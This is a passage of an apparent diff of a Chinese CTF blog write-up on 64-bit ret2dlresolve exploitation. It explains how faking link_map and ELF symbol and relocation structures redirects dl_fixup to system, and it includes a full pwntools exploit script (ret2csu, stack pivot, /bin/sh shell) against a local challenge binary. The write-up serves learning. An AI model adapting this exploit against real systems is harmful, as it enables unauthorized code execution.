+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don't look in the global scope.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)<span class="comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) <span class="comment">//mov rax, qword ptr [r10 + 0x1c8]</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*省略*/</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>当我们将(sym-&gt;st_other)&amp;0x03设置为非0时，会进入else语句，此时else中通过<code>DL_FIXUP_MAKE_VALUE</code>来获取函数的真实地址，所以<strong>我们只需要将l-&gt;l_addr + sym-&gt;st_value指向system语句即可进入system函数（具体可以看我前面总结的那几个关键的宏，他们是一层一层调用的，最终简化出来就是这个式子）</strong></p>
 <hr>
 <p><strong>PS:</strong><br>可能到这里很多人都忘了l和sym到底是什么了。。来复习一下，l是指向link_map的指针，sym是</p>
-<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span>
-<span class="hljs-function">  </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];
-   <span class="hljs-comment">//将(reloc-&gt;r_info)&gt;&gt;32作为.dynsym下标，得到函数所对应的Elf64_Sym指针，记作sym</span></code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span></span><br><span class="line"><span class="function">  </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">   <span class="comment">//将(reloc-&gt;r_info)&gt;&gt;32作为.dynsym下标，得到函数所对应的Elf64_Sym指针，记作sym</span></span><br></pre></td></tr></table></figure>
 <p>而link_map结构体大致如下：</p>
-<pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span>
-<span class="hljs-class">  &#123;</span>
-    ElfW(Addr) l_addr;                <span class="hljs-comment">/* Base address shared object is loaded at.  */</span>
-    <span class="hljs-keyword">char</span> *l_name;                     <span class="hljs-comment">/* Absolute file name object was found in.  */</span>
-    ElfW(Dyn) *l_ld;                  <span class="hljs-comment">/* Dynamic section of the shared object.  */</span>
-    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects.  */</span>
-    <span class="hljs-comment">//......省略一大堆</span>
-  &#125;;</code></pre>
-<p>其实link_map是个超级大的结构体<img src="https://s1.ax1x.com/2020/06/11/tbs9ot.png" srcset="/img/loading.gif" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;                <span class="comment">/* Base address shared object is loaded at.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;                     <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;                  <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">    <span class="comment">//......省略一大堆</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+<p>其实link_map是个超级大的结构体<img src="https://s1.ax1x.com/2020/06/11/tbs9ot.png" alt=""></p>
 <hr>
 <p>但是当我们不知道system函数的地址时，可以采用以下方法：<strong>让sym-&gt;st_value等于某个got上已经解析了的函数的那一表项，然后l-&gt;l_addr设置为system与这个函数的偏移值</strong>，此外，伪造link_map我们还需要伪造：<em>位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针，另外strtab必须是个可读的地址，因此我们还需要伪造位于link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，在构造的过程中一般将reloc_arg作为0来进行构造。</em></p>
 <ul>
-<li>已知link_map地址<em>0x7ffff7ffe168</em>，我们看一下link_map+0x70<img src="https://s1.ax1x.com/2020/06/11/tbqwNV.png" srcset="/img/loading.gif" alt=""></li>
-<li>再对照一下 <em>.dynamic</em>段中的内容,没问题：<img src="https://s1.ax1x.com/2020/06/11/tbqWAx.png" srcset="/img/loading.gif" alt=""></li>
-<li><em>通过跟踪dl_fixup 函数发现，dl_fixup引用了link_map+0x68/0x70/0xf8处的3个值来寻找STRTAB/SYMTAB/JMPREL这3个表。</em><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><pre><code class="hljs py"><span class="hljs-comment"># encoding=utf-8</span>
-<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-
-
-context.log_level=<span class="hljs-string">'debug'</span>
-context.terminal=<span class="hljs-string">'/bin/zsh'</span>
-
-libc = ELF(<span class="hljs-string">"./libc-2.23.so"</span>)
-elf = ELF(<span class="hljs-string">"./ret2-dl"</span>)
-
-bss = elf.bss()
-log.info(<span class="hljs-string">".bss :0x%X"</span>%bss)
-write_addr = bss+<span class="hljs-number">0xac0</span>    <span class="hljs-comment"># 这里要调试一下，rsp有可能落在非bss上</span>
-rbp = write_addr<span class="hljs-number">-0x8</span>
-fake_link_map_addr = write_addr+<span class="hljs-number">0x18</span>
-vuln_addr = <span class="hljs-number">0x0000000000400687</span>
-pop7ret = <span class="hljs-number">0x000000000040073a</span>
-mov3call = <span class="hljs-number">0x0000000000400720</span>
-plt_load = <span class="hljs-number">0x4004e6</span> <span class="hljs-comment"># jmp</span>
-read_got = elf.got[<span class="hljs-string">'read'</span>]
-
-<span class="hljs-comment"># ELF64_sym_size = 0x18</span>
-<span class="hljs-comment"># ELF64_Rela_size = 0x18</span>
-
-
-<span class="hljs-string">'''</span>
-<span class="hljs-string">typedef struct            </span>
-<span class="hljs-string">&#123;</span>
-<span class="hljs-string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span>
-<span class="hljs-string">      unsigned char    st_info;    /* Symbol type and binding */        </span>
-<span class="hljs-string">      unsigned char st_other;        /* Symbol visibility */              </span>
-<span class="hljs-string">      Elf64_Section    st_shndx;    /* Section index */                  </span>
-<span class="hljs-string">      Elf64_Addr    st_value;        /* Symbol value */                   </span>
-<span class="hljs-string">      Elf64_Xword    st_size;        /* Symbol size */                    </span>
-<span class="hljs-string">&#125;Elf64_Sym;</span>
-<span class="hljs-string"> </span>
-<span class="hljs-string">typedef struct           </span>
-<span class="hljs-string">&#123;</span>
-<span class="hljs-string">  Elf64_Addr    r_offset;        /* Address */                         </span>
-<span class="hljs-string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span>
-<span class="hljs-string">  Elf64_Sxword    r_addend;        /* Addend */                          </span>
-<span class="hljs-string">&#125;Elf64_Rela;</span>
-<span class="hljs-string"> </span>
-<span class="hljs-string">typedef struct          </span>
-<span class="hljs-string">&#123;</span>
-<span class="hljs-string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span>
-<span class="hljs-string">  union</span>
-<span class="hljs-string">    &#123;</span>
-<span class="hljs-string">      Elf64_Xword d_val;        /* Integer value */</span>
-<span class="hljs-string">      Elf64_Addr d_ptr;            /* Address value */</span>
-<span class="hljs-string">    &#125; d_un;</span>
-<span class="hljs-string">&#125;Elf64_Dyn;</span>
-<span class="hljs-string">'''</span>
-
-
-<span class="hljs-comment">#fake_Elf64_Dyn_STR_addr = link_map +0x68  </span>
-<span class="hljs-comment">#fake_Elf64_Dyn_SYM_addr = link_map +0x70  </span>
-<span class="hljs-comment">#fake_Elf64_Dyn_JMPREL_addr = link_map +0xf8</span>
-
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_fake_link_map</span><span class="hljs-params">(fake_link_map_addr,l_addr,st_value)</span>:</span>
-  <span class="hljs-comment"># 给出各个指针的假地址</span>
-  fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)
-  fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)
-  fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)
-
-  <span class="hljs-comment"># 伪造相关结构体</span>
-  fake_Elf64_Dyn_SYM = flat(p64(<span class="hljs-number">0</span>),p64(st_value<span class="hljs-number">-8</span>))
-  fake_Elf64_Dyn_JMPREL = flat(p64(<span class="hljs-number">0</span>),p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)  )<span class="hljs-comment"># JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span>
-  r_offset = fake_link_map_addr - l_addr
-  log.info(<span class="hljs-string">"r_offset :"</span>+str(hex(r_offset)))
-  fake_Elf64_rela = flat(p64(r_offset),p64(<span class="hljs-number">7</span>),p64(<span class="hljs-number">0</span>))
-
-  <span class="hljs-comment"># fake_link_map整体结构</span>
-  fake_link_map = flat(   <span class="hljs-comment"># 0x0</span>
-    p64(l_addr),          <span class="hljs-comment"># 0x8</span>
-    fake_Elf64_Dyn_SYM,   <span class="hljs-comment"># 0x18</span>
-    fake_Elf64_Dyn_JMPREL,<span class="hljs-comment"># 0x28</span>
-    fake_Elf64_rela,      <span class="hljs-comment"># 0x40</span>
-    <span class="hljs-string">"\x00"</span>*<span class="hljs-number">0x28</span>,         <span class="hljs-comment"># 0x68，下面开始放指针</span>
-    fake_Elf64_Dyn_STR_addr,  <span class="hljs-comment"># STRTAB指针,0x70</span>
-    fake_Elf64_Dyn_SYM_addr,  <span class="hljs-comment"># SYMTAB指针,0x78</span>
-    <span class="hljs-string">"/bin/sh\x00"</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">"\x00"</span>),
-    fake_Elf64_Dyn_JMPREL_addr, <span class="hljs-comment"># JMPREL指针</span>
-  )
-  <span class="hljs-keyword">return</span> fake_link_map
-  
-
-
-
-
-
-l_addr = libc.sym[<span class="hljs-string">'system'</span>] - libc.sym[<span class="hljs-string">'__libc_start_main'</span>] <span class="hljs-comment"># l-&gt;l_addr设置为 system 与 __libc_start_main 的偏移值,此时__libc_start_main是一个已经解析过的函数</span>
-log.info(<span class="hljs-string">"l_addr :"</span>+str(hex(l_addr)))
-log.info(<span class="hljs-string">"elf.got['__libc_start_main'] :"</span>+str(hex(elf.got[<span class="hljs-string">'__libc_start_main'</span>])))
-log.info(<span class="hljs-string">"plt_load :"</span>+str(hex(<span class="hljs-number">0x4004e6</span>)))
-log.info(<span class="hljs-string">"write_addr :"</span>+str(hex(write_addr)))
-<span class="hljs-comment">#l-&gt;l_addr + sym-&gt;st_value</span>
-<span class="hljs-comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span>
-st_value = elf.got[<span class="hljs-string">'__libc_start_main'</span>]
-fake_link_map = get_fake_link_map(fake_link_map_addr,l_addr,st_value)
-
-io = process(<span class="hljs-string">"./ret2-dl"</span>)
-
-<span class="hljs-comment"># 1. 首先，利用栈迁移，把fake_link_map放在bss段上</span>
-rop = flat( <span class="hljs-string">'a'</span>*<span class="hljs-number">0x70</span>,  <span class="hljs-comment"># 此时到达老rbp</span>
-            p64(rbp),
-            p64(pop7ret),
-            p64(<span class="hljs-number">0</span>),
-            p64(<span class="hljs-number">1</span>),
-            p64(read_got),  <span class="hljs-comment"># 重新调用read函数  r12</span>
-            p64(len(fake_link_map)+<span class="hljs-number">0x18</span>+<span class="hljs-number">0x10</span>),   <span class="hljs-comment"># read读入长度 </span>
-            p64(write_addr),                  <span class="hljs-comment"># read读入位置  </span>
-            p64(<span class="hljs-number">0</span>),                               <span class="hljs-comment"># </span>
-            p64(mov3call),
-            p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> ,                        <span class="hljs-comment"># 补位</span>
-            p64(vuln_addr)                       <span class="hljs-comment"># 再返回vuln函数</span>
-)
-log.info(hex(len(fake_link_map)+<span class="hljs-number">0x18</span>+<span class="hljs-number">0x10</span>))
-io.sendline(rop)        <span class="hljs-comment"># 此rop中包含了ret2csu，利用其向bss上读数据</span>
-
-sleep(<span class="hljs-number">1</span>)
-
-<span class="hljs-comment"># 2. 接下来，由于我们在rop中利用ret2csu调用了read函数，我们开始向bss上读数据，以下数据内容是由rop中ret2csu调用的read函数读取的。</span>
-fake = flat(
-            p64(plt_load),
-            p64(fake_link_map_addr),
-            p64(<span class="hljs-number">0</span>),
-            fake_link_map      <span class="hljs-comment"># fake_link_map本体</span>
-)
-log.info(hex(len(fake)))
-io.sendline(fake)
-attach(io)
-pause()
-pop_rdi_ret = <span class="hljs-number">0x0000000000400743</span>
-leave = <span class="hljs-number">0x4006a6</span>
-stack_mig = flat(
-            <span class="hljs-string">'a'</span>*<span class="hljs-number">0x70</span>,
-            p64(rbp),
-            p64(pop_rdi_ret),
-            p64(fake_link_map_addr+<span class="hljs-number">0x78</span>), <span class="hljs-comment"># /bin/sh</span>
-            p64(leave)
-)
-sleep(<span class="hljs-number">1</span>)
-io.sendline(stack_mig)
-
-io.interactive()</code></pre>
+<li>已知link_map地址<em>0x7ffff7ffe168</em>，我们看一下link_map+0x70<img src="https://s1.ax1x.com/2020/06/11/tbqwNV.png" alt=""></li>
+<li>再对照一下 <em>.dynamic</em>段中的内容,没问题：<img src="https://s1.ax1x.com/2020/06/11/tbqWAx.png" alt=""></li>
+<li><em>通过跟踪dl_fixup 函数发现，dl_fixup引用了link_map+0x68/0x70/0xf8处的3个值来寻找STRTAB/SYMTAB/JMPREL这3个表。</em><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2-dl"</span>)</span><br><span class="line"></span><br><span class="line">bss = elf.bss()</span><br><span class="line">log.info(<span class="string">".bss :0x%X"</span>%bss)</span><br><span class="line">write_addr = bss+<span class="number">0xac0</span>    <span class="comment"># 这里要调试一下，rsp有可能落在非bss上</span></span><br><span class="line">rbp = write_addr<span class="number">-0x8</span></span><br><span class="line">fake_link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">vuln_addr = <span class="number">0x0000000000400687</span></span><br><span class="line">pop7ret = <span class="number">0x000000000040073a</span></span><br><span class="line">mov3call = <span class="number">0x0000000000400720</span></span><br><span class="line">plt_load = <span class="number">0x4004e6</span> <span class="comment"># jmp</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ELF64_sym_size = 0x18</span></span><br><span class="line"><span class="comment"># ELF64_Rela_size = 0x18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = link_map +0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = link_map +0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = link_map +0xf8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fake_link_map</span><span class="params">(fake_link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">  <span class="comment"># 给出各个指针的假地址</span></span><br><span class="line">  fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)</span><br><span class="line">  fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + <span class="number">0x8</span>)</span><br><span class="line">  fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 伪造相关结构体</span></span><br><span class="line">  fake_Elf64_Dyn_SYM = flat(p64(<span class="number">0</span>),p64(st_value<span class="number">-8</span>))</span><br><span class="line">  fake_Elf64_Dyn_JMPREL = flat(p64(<span class="number">0</span>),p64(fake_link_map_addr+<span class="number">0x28</span>)  )<span class="comment"># JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span></span><br><span class="line">  r_offset = fake_link_map_addr - l_addr</span><br><span class="line">  log.info(<span class="string">"r_offset :"</span>+str(hex(r_offset)))</span><br><span class="line">  fake_Elf64_rela = flat(p64(r_offset),p64(<span class="number">7</span>),p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment"># fake_link_map整体结构</span></span><br><span class="line">  fake_link_map = flat(   <span class="comment"># 0x0</span></span><br><span class="line">    p64(l_addr),          <span class="comment"># 0x8</span></span><br><span class="line">    fake_Elf64_Dyn_SYM,   <span class="comment"># 0x18</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL,<span class="comment"># 0x28</span></span><br><span class="line">    fake_Elf64_rela,      <span class="comment"># 0x40</span></span><br><span class="line">    <span class="string">"\x00"</span>*<span class="number">0x28</span>,         <span class="comment"># 0x68，下面开始放指针</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr,  <span class="comment"># STRTAB指针,0x70</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr,  <span class="comment"># SYMTAB指针,0x78</span></span><br><span class="line">    <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x80</span>,<span class="string">"\x00"</span>),</span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr, <span class="comment"># JMPREL指针</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">return</span> fake_link_map</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>] <span class="comment"># l-&gt;l_addr设置为 system 与 __libc_start_main 的偏移值,此时__libc_start_main是一个已经解析过的函数</span></span><br><span class="line">log.info(<span class="string">"l_addr :"</span>+str(hex(l_addr)))</span><br><span class="line">log.info(<span class="string">"elf.got['__libc_start_main'] :"</span>+str(hex(elf.got[<span class="string">'__libc_start_main'</span>])))</span><br><span class="line">log.info(<span class="string">"plt_load :"</span>+str(hex(<span class="number">0x4004e6</span>)))</span><br><span class="line">log.info(<span class="string">"write_addr :"</span>+str(hex(write_addr)))</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line">st_value = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">fake_link_map = get_fake_link_map(fake_link_map_addr,l_addr,st_value)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2-dl"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 首先，利用栈迁移，把fake_link_map放在bss段上</span></span><br><span class="line">rop = flat( <span class="string">'a'</span>*<span class="number">0x70</span>,  <span class="comment"># 此时到达老rbp</span></span><br><span class="line">            p64(rbp),</span><br><span class="line">            p64(pop7ret),</span><br><span class="line">            p64(<span class="number">0</span>),</span><br><span class="line">            p64(<span class="number">1</span>),</span><br><span class="line">            p64(read_got),  <span class="comment"># 重新调用read函数  r12</span></span><br><span class="line">            p64(len(fake_link_map)+<span class="number">0x18</span>+<span class="number">0x10</span>),   <span class="comment"># read读入长度 </span></span><br><span class="line">            p64(write_addr),                  <span class="comment"># read读入位置  </span></span><br><span class="line">            p64(<span class="number">0</span>),                               <span class="comment"># </span></span><br><span class="line">            p64(mov3call),</span><br><span class="line">            p64(<span class="number">0</span>)*<span class="number">7</span> ,                        <span class="comment"># 补位</span></span><br><span class="line">            p64(vuln_addr)                       <span class="comment"># 再返回vuln函数</span></span><br><span class="line">)</span><br><span class="line">log.info(hex(len(fake_link_map)+<span class="number">0x18</span>+<span class="number">0x10</span>))</span><br><span class="line">io.sendline(rop)        <span class="comment"># 此rop中包含了ret2csu，利用其向bss上读数据</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 接下来，由于我们在rop中利用ret2csu调用了read函数，我们开始向bss上读数据，以下数据内容是由rop中ret2csu调用的read函数读取的。</span></span><br><span class="line">fake = flat(</span><br><span class="line">            p64(plt_load),</span><br><span class="line">            p64(fake_link_map_addr),</span><br><span class="line">            p64(<span class="number">0</span>),</span><br><span class="line">            fake_link_map      <span class="comment"># fake_link_map本体</span></span><br><span class="line">)</span><br><span class="line">log.info(hex(len(fake)))</span><br><span class="line">io.sendline(fake)</span><br><span class="line">attach(io)</span><br><span class="line">pause()</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400743</span></span><br><span class="line">leave = <span class="number">0x4006a6</span></span><br><span class="line">stack_mig = flat(</span><br><span class="line">            <span class="string">'a'</span>*<span class="number">0x70</span>,</span><br><span class="line">            p64(rbp),</span><br><span class="line">            p64(pop_rdi_ret),</span><br><span class="line">            p64(fake_link_map_addr+<span class="number">0x78</span>), <span class="comment"># /bin/sh</span></span><br><span class="line">            p64(leave)</span><br><span class="line">)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(stack_mig)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="后续奇怪的调试以及64位32位的一个差别"><a href="#后续奇怪的调试以及64位32位的一个差别" class="headerlink" title="后续奇怪的调试以及64位32位的一个差别"></a>后续奇怪的调试以及64位32位的一个差别</h2></li>
-<li>在编写exp的时候，遇到了一些诡异的问题，比如一开始想把他放在bss+0x500，结果。。<img src="https://s1.ax1x.com/2020/06/13/tvPj1g.jpg" srcset="/img/loading.gif" alt="">)出现了诡异的非法内存访问。。在64位下调用的是<code>_dl_runtime_resolve_xsavec</code>,这个函数起始是有写地址操作的。但是按理说我应该把他已经放上bss了而bss是可读可写的，看一下这个时候的rsp，确实落在一个不可写的区间，并且这个区间是相对bss有偏移的。<img src="https://s1.ax1x.com/2020/06/13/tviI8U.jpg" srcset="/img/loading.gif" alt=""></li>
-<li>leave之后确实栈被拉到了bss+0x500<img src="https://s1.ax1x.com/2020/06/13/tvF5dI.png" srcset="/img/loading.gif" alt=""></li>
-<li>一直到进入<code>_dl_runtime_resolve_xsavec</code>都是没问题的。看来问题就是出在下面那两条指令上了。<img src="https://s1.ax1x.com/2020/06/13/tvk16e.png" srcset="/img/loading.gif" alt=""></li>
